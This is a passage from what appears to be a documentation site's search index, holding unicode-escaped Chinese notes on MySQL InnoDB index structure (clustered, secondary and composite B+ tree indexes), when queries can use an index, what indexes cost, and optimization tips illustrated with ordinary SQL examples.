8fd9\u9875\u5c31\u6ca1\u5fc5\u8981\u5b58\u5728\uff0c\u90a3\u4e48\u8fd9\u9875\u5bf9\u5e94\u7684\u76ee\u5f55\u9879\u4e5f\u6ca1\u5fc5\u8981\u5b58\u5728\uff0c\u628a\u76ee\u5f55\u9879\u5220\u9664\u540e\u5176\u540e\u7684\u76ee\u5f55\u9879\u90fd\u5f97\u5411\u524d\u79fb\u52a8\u4e00\u4e0b\uff0c\u8fd9\u663e\u7136\u4e0d\u662f\u597d\u7684\u8bbe\u8ba1\u3002</p> <p>\u56e0\u6b64InnoDB\u590d\u7528\u4e86\u6570\u636e\u9875\u6765\u5b58\u50a8\u76ee\u5f55\u9879\uff0c\u6bcf\u6761\u8bb0\u5f55\u5c31\u662f\u4e00\u4e2a\u76ee\u5f55\u9879\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u6761\u8bb0\u5f55\u7684record_type\u662f1\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u6761\u76ee\u5f55\u9879\u8bb0\u5f55\uff0c\u73b0\u5728\u53d8\u6210\u4e86\u8fd9\u6837:</p> <p></p> <p>\u5982\u679c\u4e00\u4e2a\u76ee\u5f55\u9875\u653e\u6ee1\u4e86\uff0c\u5c31\u65b0\u589e\u4e00\u4e2a\u76ee\u5f55\u9875\uff0c\u540c\u65f6\u5728\u5176\u4e0a\u518d\u52a0\u4e00\u5c42\u76ee\u5f55\u9875\u8bb0\u5f55\u8fd9\u4e24\u4e2a\u76ee\u5f55\u9875\u3002\u8fd9\u79cd\u6570\u636e\u7ec4\u7ec7\u65b9\u5f0f\u5c31\u662f\u200bB+\u6811\u3002</p> <p>\u8fd9\u79cd\u7ec4\u7ec7\u65b9\u5f0f\u6709\u4e24\u4e2a\u7279\u70b9:</p> <p>1\u3001\u4f7f\u7528\u8bb0\u5f55\u4e3b\u952e\u503c\u7684\u5927\u5c0f\u8fdb\u884c\u8bb0\u5f55\u548c\u2eda\u7684\u6392\u5e8f\uff0c\u8fd9\u5305\u62ec\u4e09\u4e2a\u65b9\u9762\u7684\u542b\u4e49:</p> <ul> <li>\u2eda\u5185\u7684\u8bb0\u5f55\u662f\u6309\u7167\u4e3b\u952e\u7684\u5927\u5c0f\u987a\u5e8f\u6392\u6210\u4e00\u4e2a\u5355\u5411\u94fe\u8868</li> <li>\u5404\u4e2a\u5b58\u653e\u7528\u6237\u8bb0\u5f55\u7684\u2eda\u662f\u6839\u636e\u2eda\u4e2d\u7528\u6237\u8bb0\u5f55\u7684\u4e3b\u952e\u5927\u5c0f\u987a\u5e8f\u6392\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868</li> <li>\u5b58\u653e\u76ee\u5f55\u9879\u8bb0\u5f55\u7684\u2eda\u5206\u4e3a\u4e0d\u540c\u7684\u5c42\u6b21\uff0c\u5728\u540c\u4e00\u5c42\u6b21\u4e2d\u7684\u2eda\u662f\u6839\u636e\u2eda\u4e2d\u76ee\u5f55\u9879\u8bb0\u5f55\u7684\u4e3b\u952e\u5927\u5c0f\u987a\u5e8f\u6392\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868</li> </ul> <p>2\u3001B+\u6811\u7684\u53f6\u5b50\u8282\u70b9\u5b58\u50a8\u7684\u662f\u5b8c\u6574\u7684\u7528\u6237\u8bb0\u5f55\uff0c\u5373\u8bb0\u5f55\u4e2d\u5305\u542b\u4e86\u6240\u6709\u5217\u7684\u503c\u3002</p> <p>\u6211\u4eec\u628a\u7b26\u5408\u8fd9\u4e24\u4e2a\u7279\u70b9\u7684B+\u6811\u79f0\u4e3a\u200b\u805a\u7c07\u7d22\u5f15\uff0cInnoDB\u4f1a\u81ea\u52a8\u4e3a\u6211\u4eec\u521b\u5efa\u805a\u7c07\u7d22\u5f15\uff0c\u800c\u7531\u4e8e\u6240\u6709\u7684\u8bb0\u5f55\u90fd\u5728\u53f6\u5b50\u8282\u70b9\u4e0a\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u200b\u7d22\u5f15\u5373\u6570\u636e\uff0c\u6570\u636e\u5373\u7d22\u5f15\u3002</p>"},{"location":"mysql/theory/#_13","title":"\u4e8c\u7ea7\u7d22\u5f15","text":"<p>\u4e0a\u9762\u7684\u805a\u7c07\u7d22\u5f15\u53ea\u5728\u641c\u7d22\u6761\u4ef6\u662f\u4e3b\u952e\u662f\u624d\u8d77\u4f5c\u7528\uff0c\u5982\u679c\u4ee5\u522b\u7684\u5217\u4e3a\u641c\u7d22\u6761\u4ef6\u53c8\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u591a\u5efa\u51e0\u9897B+\u6811\u3002\u6548\u679c\u5982\u56fe\u6240\u793a:</p> <p></p> <p>\u8fd9\u9897B+\u6811\u5047\u8bbe\u6211\u4eec\u4ee5x\u5217\u53bb\u5efa\u7acb\u7d22\u5f15\uff0c\u90a3\u4e48\u6bcf\u4e2a\u6570\u636e\u9875\u5185\u7684\u8bb0\u5f55\u5c31\u662f\u6309\u7167x\u5217\u7684\u5927\u5c0f\u987a\u5e8f\u6392\u5217\u7684\uff0c\u548c\u4e0a\u9762\u7684\u7c7b\u4f3c\uff0c\u4e0d\u540c\u7684\u662f\u8fd9\u6761\u8bb0\u5f55\u53ea\u6709\u4e00\u4e2ax\u5217\u7684\u503c\u548c\u5176\u5bf9\u5e94\u7684\u4e3b\u952e\u7684\u503c\u3002\u6240\u4ee5\uff0c\u5f53\u6211\u4eec\u53bb\u6309x=3\u8fd9\u6837\u7684\u641c\u7d22\u6761\u4ef6\u67e5\u627e\u6570\u636e\u65f6\uff0c\u5c31\u4f1a\u5148\u6839\u636e\u8fd9\u9897\u65b0\u7684B+\u6811\u786e\u5b9ax=3\u65f6\u5bf9\u5e94\u7684\u4e3b\u952e\u662f\u4ec0\u4e48\uff0c\u5728\u6839\u636e\u4e3b\u952e\u53bb\u805a\u7c07\u7d22\u5f15\u4e2d\u67e5\u627e\u5230\u5b8c\u6574\u7684\u4e00\u6761\u8bb0\u5f55\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e5f\u88ab\u79f0\u4e3a\u200b\u56de\u8868\u3002<code>\u4e8c\u7ea7\u7d22\u5f15(Secondary index)</code>\u8fd9\u4e2a\u540d\u79f0\u4e5f\u6b63\u662f\u56e0\u4e3a\u9700\u8981\u4e24\u9897B+\u6811\uff0c\u64cd\u4f5c\u4e24\u6b21\u3002</p> <p>\u6211\u4eec\u89c2\u5bdf\u5230\u4e0a\u56fe\u4e2d\u5b58\u50a8\u76ee\u5f55\u9879\u7684\u8bb0\u5f55\u53ea\u5305\u542b\u4e86x\u7684\u503c\u548c\u9875\u53f7\uff0c\u5b9e\u9645\u4e0a\u8fd9\u5728\u4e8c\u7ea7\u7d22\u5f15\u4e2d\u4f1a\u5b58\u5728bug\uff0c\u6709\u53ef\u80fd\u5f88\u591a\u6761\u8bb0\u5f55\u4e2dx\u7684\u503c\u90fd\u662f\u76f8\u540c\u7684\uff0c\u6b64\u65f6\u518d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\u5c31\u4e0d\u77e5\u9053\u8981\u63d2\u5728\u54ea\u4e2a\u4f4d\u7f6e\u4e86\u3002\u56e0\u6b64\u8fd9\u9897B+\u6811\u4e2d\u53f6\u5b50\u8282\u70b9\u6bcf\u6761\u8bb0\u5f55\u662fx\u7684\u503c\u548c\u4e3b\u952e\u7684\u503c\uff0cx\u76f8\u540c\u5219\u6309\u4e3b\u952e\u5927\u5c0f\u987a\u5e8f\u6392\u5217\uff0c\u76ee\u5f55\u9879\u8282\u70b9\u7684\u6bcf\u6761\u8bb0\u5f55\u662fx\u7684\u503c\u3001\u4e3b\u952e\u7684\u503c\u3001\u9875\u7684\u53f7\u7801\uff0cx\u76f8\u540c\u65f6\u4e5f\u53ef\u6309\u4e3b\u952e\u6392\u5e8f\u3002</p>"},{"location":"mysql/theory/#_14","title":"\u8054\u5408\u7d22\u5f15","text":"<p>\u8054\u5408\u7d22\u5f15\u5c31\u662f\u540c\u65f6\u4ee5\u591a\u4e2a\u5217\u4f5c\u4e3a\u6392\u5e8f\u89c4\u5219\uff0c\u6bd4\u5982\u5217x\u548c\u5217y\u7684\u8054\u5408\u7d22\u5f15\u5c31\u662f\u5148\u4ee5x\u4e3a\u6392\u5e8f\u4f9d\u636e\uff0cx\u76f8\u7b49\u65f6\u4ee5y\u4f5c\u4e3a\u6392\u5e8f\u4f9d\u636e\u3002\u53ea\u9700\u8981\u6839\u636e\u4e8c\u7ea7\u7d22\u5f15\u7684B+\u6811\u7a0d\u4f5c\u6539\u9020\u5373\u53ef\uff0c\u6bcf\u6761\u8bb0\u5f55\u5b58\u653ex\u3001y\u548c\u4e3b\u952e\u7684\u503c\u5373\u53ef\u3002</p>"},{"location":"mysql/theory/#_15","title":"\u4f7f\u7528\u573a\u666f","text":"<p>\u54ea\u4e9b\u60c5\u51b5\u80fd\u7528\u5230\u7d22\u5f15\uff0c\u54ea\u4e9b\u60c5\u51b5\u65e0\u6cd5\u7528\u5230\u5462\uff1f\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u770b: <pre><code>CREATE TABLE person_info(\n    id INT NOT NULL auto_increment,\n    name VARCHAR(100) NOT NULL,\n    birthday DATE NOT NULL,\n    phone_number CHAR(11) NOT NULL,\n    country varchar(100) NOT NULL,\n    PRIMARY KEY (id),\n    KEY idx_name_birthday_phone_number (name, birthday, phone_number) \n);\n</code></pre> \u5148\u5efa\u4e86\u4e00\u4e2a\u8868\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u81ea\u52a8\u4e3a\u4e3b\u952eid\u5efa\u7acb\u7684\u805a\u7c07\u7d22\u5f15\uff0c\u548c\u4e00\u4e2a\u4e8c\u7ea7\u7d22\u5f15idx_name_birthday_phone_number\uff0c\u5b83\u662f\u7531\u4e09\u4e2a\u5217\u7ec4\u6210\u7684\u8054\u5408\u7d22\u5f15\u3002\u5982\u4e0b\u60c5\u51b5\u53ef\u4ee5\u4f7f\u7528\u5230\u7d22\u5f15:</p> <p>\u5168\u503c\u5339\u914d \u5f53\u6211\u4eec\u7684\u641c\u7d22\u6761\u4ef6\u4e2d\u7684\u5217\u548c\u7d22\u5f15\u4e2d\u7684\u5217\u4e00\u81f4\u65f6\uff0c\u5982<code>SELECT * FROM person_info WHERE name = 'Ashburn' AND birthday = '1990-09-27' AND phone_number = '15123983239';</code>\uff0c\u82e5\u8c03\u6362name\u3001birthday\u3001phone_number\u7684\u987a\u5e8f\u4e5f\u662f\u53ef\u4ee5\u4f7f\u7528\u5230\u7d22\u5f15\u7684\uff0c\u56e0\u4e3aMysql\u7684\u67e5\u8be2\u4f18\u5316\u5668\u4f1a\u5e2e\u6211\u4eec\u4f18\u5316\u8fd9\u79cd\u60c5\u51b5\u3002</p> <p>\u5339\u914d\u5de6\u8fb9\u7684\u5217 \u5728\u641c\u7d22\u8bed\u53e5\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u5305\u542b\u5168\u90e8\u7d22\u5f15\u7684\u5217\uff0c\u53ea\u5339\u914d\u5de6\u8fb9\u7684\u90e8\u5206\u5217\u3002\u5982<code>SELECT * FROM person_info WHERE name = 'Ashburn';</code>\u662f\u53ef\u4ee5\u7528\u5230\u7d22\u5f15\u7684\uff0c\u641c\u7d22\u6761\u4ef6\u4e2d\u7684\u5217\u53ea\u8981\u662f\u4ece\u8054\u5408\u7d22\u5f15\u5217\u7684\u6700\u5de6\u8fb9\u5f00\u59cb\u7684\u3001\u8fde\u7eed\u7684\u5217\u5c31\u80fd\u5339\u914d\u5230\u3002</p> <p>\u5339\u914d\u5217\u524d\u7f00 \u5bf9\u4e8e\u5b57\u7b26\u4e32\u800c\u8a00\uff0c\u5176\u6392\u5e8f\u7684\u672c\u8d28\u5c31\u662f\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u5927\u5c0f\uff0c\u4e00\u822c\u7684\u89c4\u5219\u5c31\u662f\u6bd4\u8f83\u9010\u4e2a\u5b57\u7b26\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5339\u914d\u5b57\u7b26\u4e32\u7684\u524dn\u4e2a\u5b57\u7b26\u4e5f\u662f\u53ef\u4ee5\u7528\u5230\u7d22\u5f15\u7684\uff0c\u5982<code>SELECT * FROM person_info WHERE name LIKE 'As%';</code>\uff0c\u4f46\u82e5\u6ca1\u6709\u4ece\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5f00\u59cb\u5339\u914d\u5219\u7528\u4e0d\u5230\u7d22\u5f15\u3002\u6709\u65f6\u5019\u6211\u4eec\u6709\u5339\u914d\u5b57\u7b26\u4e32\u540e\u7f00\u7684\u9700\u6c42\uff0c\u4f8b\u5982\u67d0\u4e00\u5217\u662furl\uff0c\u5176\u524d\u7f00\u90fd\u662fwww\uff0c\u8fd9\u79cd\u60c5\u51b5\u6211\u4eec\u53ef\u4ee5\u628a\u8868\u4e2d\u7684\u6570\u636e\u9006\u5e8f\u5b58\u50a8\uff0c\u518d\u4f7f\u7528\u5339\u914d\u5217\u524d\u7f00\u7684\u65b9\u5f0f\u5c31\u53ef\u4ee5\u7528\u5230\u7d22\u5f15\u4e86\u3002</p> <p>\u5339\u914d\u8303\u56f4\u503c \u5f53\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u8303\u56f4\u7684\u503c\u65f6\u4e5f\u53ef\u4ee5\u7528\u5230\u7d22\u5f15\uff0c\u56e0\u4e3a\u6240\u6709\u8bb0\u5f55\u90fd\u662f\u6309\u7167\u7d22\u5f15\u5217\u7684\u503c\u7531\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u6392\u5217\u7684\u3002\u5982<code>SELECT * FROM person_info WHERE name &gt; 'Asa' AND name &lt; 'Barlow' AND birthday &gt; '1980-01-01';</code>\u53ef\u4ee5\u7528\u5230name\u5217\u7684\u7d22\u5f15\uff0c\u4f46\u65e0\u6cd5\u7528\u5230birthday\u7684\u7d22\u5f15\uff0c\u56e0\u4e3aname\u67e5\u51fa\u6765\u7684\u8bb0\u5f55\u4e2d\u53ef\u80fd\u5e76\u4e0d\u662f\u6309birthday\u518d\u6392\u5e8f\u8fc7\u7684\u3002</p> <p>\u7cbe\u786e\u5339\u914d\u67d0\u4e00\u5217\u5e76\u8303\u56f4\u5339\u914d\u53e6\u5916\u4e00\u5217 \u5bf9\u4e8e\u540c\u4e00\u4e2a\u8054\u5408\u7d22\u5f15\u6765\u8bf4\uff0c\u867d\u7136\u5bf9\u591a\u4e2a\u5217\u8fdb\u884c\u8303\u56f4\u67e5\u627e\u65f6\u53ea\u80fd\u7528\u5230\u6700\u5de6\u8fb9\u90a3\u4e2a\u7d22\u5f15\u5217\uff0c\u4f46\u5982\u679c\u5de6\u8fb9\u7684\u5217\u662f\u7cbe\u786e\u67e5\u627e\uff0c\u5219\u53f3\u8fb9\u7684\u5217\u53ef\u4ee5\u7528\u8303\u56f4\u67e5\u627e\uff0c\u5982<code>SELECT * FROM person_info WHERE name = 'Ashburn' AND birthday &gt; '1980-01-01' AND birthday &lt; '2000- 12-31' AND phone_number &gt; '15100000000';</code>\uff0cname\u548cbirthday\u80fd\u7528\u5230\u7d22\u5f15\uff0cphone_number\u65e0\u6cd5\u7528\u5230\u7d22\u5f15\u3002</p> <p>\u7528\u4e8e\u6392\u5e8f \u5982\u679c\u6ca1\u6709\u7d22\u5f15\u7684\u8bdd\uff0c\u6211\u4eec\u4f1a\u628a\u6240\u6709\u7684\u8bb0\u5f55\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u901a\u8fc7\u4e00\u4e9b\u6392\u5e8f\u7b97\u6cd5\u4f8b\u5982\u5feb\u6392\u7b49\u5bf9\u8fd9\u4e9b\u8bb0\u5f55\u6392\u5e8f\uff0c\u5982\u679c\u5185\u5b58\u4e2d\u653e\u4e0d\u4e0b\u53ef\u80fd\u8fd8\u4f1a\u501f\u52a9\u786c\u76d8\u4e2d\u7684\u7a7a\u95f4\uff0c\u6700\u540e\u6392\u5e8f\u5b8c\u6210\u540e\u518d\u8fd4\u8fd8\u7ed9\u5ba2\u6237\u7aef\u3002\u5728Mysql\u4e2d\uff0c\u628a\u8fd9\u79cd\u5728\u5185\u5b58\u4e2d\u6216\u786c\u76d8\u4e2d\u8fdb\u884c\u6392\u5e8f\u7684\u65b9\u5f0f\u79f0\u4e3a\u200b\u6587\u4ef6\u6392\u5e8f(filesort)\uff0c\u662f\u975e\u5e38\u6162\u7684\u3002\u501f\u52a9\u7d22\u5f15\u53ef\u4ee5\u76f4\u63a5\u63d0\u53d6\u51fa\u6570\u636e\uff0c\u518d\u8fdb\u884c\u56de\u8868\u62ff\u5230\u5176\u4ed6\u6570\u636e\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f8b\u5982<code>SELECT * FROM person_info ORDER BY name, birthday, phone_number LIMIT 10;</code>\u3002\u4f46\u662f\uff0c\u5404\u4e2a\u6392\u5e8f\u5217\u7684\u6392\u5e8f\u987a\u5e8f\u8981\u4e00\u81f4\uff0c\u67d0\u5217asc\u3001\u67d0\u5217desc\u4e00\u8d77\u6df7\u7528\u662f\u65e0\u6cd5\u7d22\u5f15\u7684\u3002\u53e6\u5916\uff0c\u7528\u4e8e\u6392\u5e8f\u7684\u591a\u4e2a\u5217\u9700\u8981\u662f\u540c\u4e00\u4e2a\u7d22\u5f15\u91cc\u7684\uff0c\u7d22\u5f15\u5217\u4e5f\u4e0d\u80fd\u662f\u4fee\u9970\u8fc7\u7684\u5f62\u5f0f\uff0c\u5982<code>SELECT * FROM person_info ORDER BY UPPER(name) LIMIT 10;</code>\u3002</p> <p>\u7528\u4e8e\u5206\u7ec4 \u5176\u5b9e\u548c\u6392\u5e8f\u7c7b\u4f3c\uff0c\u5982<code>SELECT name, birthday, phone_number, COUNT(*) FROM person_info GROUP BY name, birthday, phone_number</code>\u3002</p>"},{"location":"mysql/theory/#_16","title":"\u4ee3\u4ef7","text":"<p>\u4f7f\u7528\u7d22\u5f15\u5728\u7a7a\u95f4\u548c\u65f6\u95f4\u4e0a\u90fd\u6709\u4ee3\u4ef7\uff0c\u6bcf\u5efa\u7acb\u4e00\u4e2a\u7d22\u5f15\u90fd\u9700\u8981\u4e00\u9897B+\u6811\uff0c\u5927\u7684B+\u6811\u7531\u5f88\u591a\u6570\u636e\u9875\u7ec4\u6210\uff0c\u7b97\u662f\u4e0d\u5c0f\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u6bcf\u6b21\u5bf9\u8868\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u64cd\u4f5c\u65f6\uff0c\u90fd\u53ef\u80fd\u8981\u4fee\u6539\u5404\u4e2a\u7d22\u5f15\u3002B+\u6811\u6bcf\u5c42\u8282\u70b9\u90fd\u662f\u6309\u7167\u7d22\u5f15\u5217\u7684\u503c\u6309\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u6392\u5e8f\u800c\u7ec4\u6210\u4e86\u53cc\u5411\u94fe\u8868\u3002\u4e0d\u8bba\u662f\u53f6\u5b50\u8282\u70b9\u7684\u8bb0\u5f55\uff0c\u8fd8\u662f\u5185\u8282\u70b9\u7684\u8bb0\u5f55\u90fd\u662f\u6309\u7167\u7d22\u5f15\u5217\u7684\u503c\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u800c\u5f62\u6210\u4e86\u4e00\u4e2a\u5355\u5411\u94fe\u8868\u3002\u800c\u589e\u3001\u5220\u3001\u6539\u64cd\u4f5c\u53ef\u80fd\u4f1a\u5bf9\u8282\u70b9\u548c\u8bb0\u5f55\u7684\u6392\u5e8f\u9020\u6210\u7834\u574f\uff0c\u6240\u4ee5\u5b58\u50a8\u5f15\u64ce\u9700\u8981\u989d\u5916\u7684\u65f6\u95f4\u8fdb\u884c\u4e00\u4e9b\u8bb0\u5f55\u79fb\u4f4d\uff0c\u2eda\u9762\u5206\u88c2\u3001\u2eda\u9762\u56de\u6536\u7b49\u64cd\u4f5c\u6765\u7ef4\u62a4\u597d\u8282\u70b9\u548c\u8bb0\u5f55\u7684\u6392\u5e8f\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u4e2a\u8868\u4e0a\u7d22\u5f15\u5efa\u7684\u8d8a\u591a\uff0c\u5c31\u4f1a\u5360\u7528\u8d8a\u591a\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u5728\u589e\u5220\u6539\u8bb0\u5f55\u7684\u65f6\u5019\u6027\u80fd\u5c31\u8d8a\u5dee\u3002</p> <p>\u6b64\u5916\uff0c\u56de\u8868\u4e5f\u662f\u6709\u4ee3\u4ef7\u7684\u3002\u4e8c\u7ea7\u7d22\u5f15B+\u6811\u8bb0\u5f55\u5728\u78c1\u76d8\u4e0a\u7684\u6570\u636e\u662f\u76f8\u8fde\u7684\uff0c\u96c6\u4e2d\u5206\u5e03\u5728\u4e00\u4e2a\u6216\u51e0\u4e2a\u6570\u636e\u9875\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u5feb\u7684\u628a\u5b83\u4eec\u8bfb\u51fa\u6765\uff0c\u8fd9\u79cd\u8bfb\u53d6\u65b9\u5f0f\u4e5f\u53eb\u200b\u987a\u5e8f\u8bfb\u53d6\uff1b\u8bfb\u53d6\u5230\u4e4b\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u4e3b\u952e\u5e76\u4e0d\u76f8\u8fde\uff0c\u8981\u8bfb\u53d6\u5230\u5b8c\u6574\u8bb0\u5f55\u5c31\u9700\u8981\u5728\u4e0d\u540c\u7684\u6570\u636e\u9875\u4e2d\u53bb\u627e\uff0c\u8fd9\u79cd\u8bfb\u53d6\u65b9\u5f0f\u53eb\u200b\u968f\u673a\u8bfb\u53d6\u3002\u9700\u8981\u56de\u8868\u7684\u8bb0\u5f55\u8d8a\u591a\uff0c\u4f7f\u7528\u4e8c\u7ea7\u7d22\u5f15\u7684\u6548\u7387\u5c31\u8d8a\u4f4e\uff0c\u751a\u81f3\u8ba9\u67d0\u4e9b\u67e5\u8be2\u5b81\u613f\u4f7f\u7528\u5168\u8868\u626b\u63cf\u4e5f\u4e0d\u4f7f\u7528\u4e8c\u7ea7\u7d22\u5f15\u3002\u6bd4\u5982name\u503c\u5728Asa~Barlow\u4e4b\u95f4\u7684\u7528\u6237\u8bb0\u5f55\u6570\u91cf\u5360\u5168\u90e8\u8bb0\u5f55\u6570\u91cf90%\u4ee5\u4e0a\uff0c\u90a3\u4e48\u5982\u679c\u4f7f\u7528idx_name_birthday_phone_number\u7d22\u5f15\u7684\u8bdd\uff0c\u670990%\u591a\u7684id\u503c\u9700\u8981\u56de\u8868\uff0c\u5c31\u8fd8\u4e0d\u5982\u5168\u8868\u626b\u63cf\u3002\u67e5\u8be2\u4f18\u5316\u5668\u4f1a\u5e2e\u6211\u4eec\u5224\u65ad\u4f55\u65f6\u8be5\u7528\u5168\u8868\u626b\u63cf\u4ee3\u66ff\u4e8c\u7ea7\u7d22\u5f15\u56de\u8868\u3002</p>"},{"location":"mysql/theory/#_17","title":"\u4f18\u5316\u7b56\u7565","text":"<p>\u8986\u76d6\u7d22\u5f15 \u4e3a\u4e86\u907f\u514d\u56de\u8868\u65f6\u7684\u635f\u8017\uff0c\u6700\u597d\u5728\u67e5\u8be2\u5217\u8868\u91cc\u53ea\u5305\u542b\u7d22\u5f15\uff0c\u5982<code>SELECT name, birthday, phone_number FROM person_info WHERE name &gt; 'Asa' AND name &lt; 'Barlow'</code>\u3002\u4e0d\u9f13\u52b1\u4f7f\u7528<code>*</code>\u53f7\u67e5\u8be2\u5217\u8868\uff0c\u6700\u597d\u628a\u9700\u8981\u67e5\u8be2\u7684\u5217\u4f9d\u6b21\u6807\u660e\u3002</p> <p>\u53ea\u4e3a\u7528\u4e8e\u641c\u7d22\u3001\u6392\u5e8f\u6216\u5206\u7ec4\u7684\u5217\u521b\u5efa\u7d22\u5f15 \u51fa\u73b0\u5728\u67e5\u8be2\u5217\u8868\u4e2d\u7684\u5217\u5c31\u6ca1\u5fc5\u8981\u7d22\u5f15\u4e86\u3002\u5982<code>SELECT birthday, country FROM person_name WHERE name = 'Ashburn'</code>\u53ea\u9700\u4e3aname\u521b\u5efa\u7d22\u5f15\uff0cbirthday\u548ccountry\u5c31\u4e0d\u9700\u8981\u4e86\u3002</p> <p>\u4e3a\u5217\u7684\u57fa\u6570\u5927\u7684\u5217\u521b\u5efa\u7d22\u5f15 \u5217\u7684\u57fa\u6570\u662f\u8bf4\u8be5\u5217\u4e2d\u4e0d\u91cd\u590d\u7684\u6570\u7684\u4e2a\u6570\uff0c\u6bd4\u5982\u6027\u522b\u8fd9\u6837\u7684\u5217\uff0c\u5176\u57fa\u6570\u4e5f\u5c312\u4e2a\uff0c\u5982\u679c\u4e3a\u5176\u5efa\u7acb\u7d22\u5f15\u91cd\u590d\u7684\u503c\u4f1a\u7279\u522b\u7684\u591a\uff0c\u6548\u679c\u5c31\u4e0d\u4f1a\u597d\u3002</p> <p>\u7d22\u5f15\u5217\u7684\u7c7b\u578b\u5c3d\u91cf\u5c0f \u8fd9\u91cc\u7684\u7c7b\u578b\u6307\u7684\u662f\u5176\u8868\u793a\u7684\u6570\u636e\u8303\u56f4\uff0c\u4f8b\u5982\u6574\u578b\u5206\u4e3aTINYINT\u3001MEDIUMINT\u3001INT\u3001BIGINT\u51e0\u79cd\uff0c\u5728\u80fd\u8868\u793a\u51fa\u6240\u9700\u6574\u6570\u7684\u524d\u63d0\u4e0b\uff0c\u80fd\u7528INT\u5c31\u4e0d\u8981\u7528BIGINT\u3002\u56e0\u4e3a\u6570\u636e\u7c7b\u578b\u8d8a\u5c0f\uff0cCPU\u505a\u6570\u5b57\u6bd4\u8f83\u65f6\u5c31\u8d8a\u5feb\uff0c\u540c\u65f6\u7d22\u5f15\u5360\u7528\u7684\u7a7a\u95f4\u5c31\u8d8a\u5c0f\uff0c\u4e00\u4e2a\u6570\u636e\u9875\u4e2d\u5c31\u80fd\u6709\u66f4\u591a\u7684\u8bb0\u5f55\uff0c\u7f13\u5b58\u5728\u5185\u5b58\u4e2d\u7684\u6570\u636e\u4e5f\u5c31\u8d8a\u591a\u3002\u8fd9\u70b9\u5bf9\u4e8e\u4e3b\u952e\u6765\u8bf4\u66f4\u662f\u5982\u6b64\uff0c\u56e0\u4e3a\u4e8c\u7ea7\u7d22\u5f15\u4e5f\u9700\u8981\u5b58\u50a8\u4e3b\u952e\u503c\u3002</p> <p>\u7d22\u5f15\u5b57\u7b26\u4e32\u503c\u7684\u524d\u7f00 \u4e5f\u5c31\u662f\u8bf4\u5728\u4e8c\u7ea7\u7d22\u5f15\u7684\u8bb0\u5f55\u4e2d\u53ea\u4fdd\u7559\u5b57\u7b26\u4e32\u7684\u524d\u51e0\u4e2a\u503c\uff0c\u67e5\u627e\u65f6\u867d\u4e0d\u80fd\u7cbe\u786e\u7684\u5b9a\u4f4d\u5230\u8bb0\u5f55\u7684\u4f4d\u7f6e\uff0c\u4f46\u80fd\u5b9a\u4f4d\u5230\u76f8\u5e94\u524d\u7f00\u7684\u4f4d\u7f6e\uff0c\u5728\u7a7a\u95f4\u548c\u65f6\u95f4\u4e0a\u53d6\u5f97\u5e73\u8861\u3002\u5728\u5b57\u7b26\u4e32\u7c7b\u578b\u80fd\u5b58\u50a8\u7684\u503c\u8f83\u591a\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u65b9\u5f0f\u662f\u975e\u5e38\u9f13\u52b1\u7684\uff0c\u5982: <pre><code>CREATE TABLE person_info(\n    name VARCHAR(100) NOT NULL,\n    birthday DATE NOT NULL,\n    phone_number CHAR(11) NOT NULL,\n    KEY idx_name_birthday_phone_number (name(10), birthday) \n);\n</code></pre> \u5c31\u8868\u793a\u7528name\u7684\u524d10\u4e2a\u5b57\u7b26\u6765\u505a\u4e3a\u7d22\u5f15\u3002\u4f46\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u80fd\u7528name\u5217\u6765\u6392\u5e8f\u4e86\uff0c\u5982<code>SELECT * FROM person_info ORDER BY name LIMIT 10;</code>\u5219\u7528\u4e0d\u5230\u7d22\u5f15\u3002</p> <p>\u8ba9\u7d22\u5f15\u5217\u5728\u6bd4\u8f83\u8868\u8fbe\u5f0f\u4e2d\u5355\u72ec\u51fa\u73b0 \u4f8b\u5982<code>WHERE col * 2 &lt; 4</code>\u5c31\u7528\u4e0d\u5230\u7d22\u5f15\uff0c\u4f46\u82e5\u5199\u6210<code>WHERE col &lt; 4/2</code>\u5c31\u80fd\u7528\u5230\u7d22\u5f15\uff0c\u6240\u4ee5\u5982\u679c\u7d22\u5f15\u5217\u5728\u6bd4\u8f83\u8868\u8fbe\u5f0f\u4e2d\u4e0d\u662f\u4ee5\u5355\u72ec\u5217\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u800c\u662f\u4ee5\u67d0\u4e2a\u8868\u8fbe\u5f0f\uff0c\u6216\u8005\u51fd\u6570\u8c03\u7528\u5f62\u5f0f\u51fa\u73b0\u7684\u8bdd\uff0c\u662f\u7528\u4e0d\u5230\u7d22\u5f15\u7684\u3002</p> <p>\u8ba9\u4e3b\u952e\u81ea\u589e 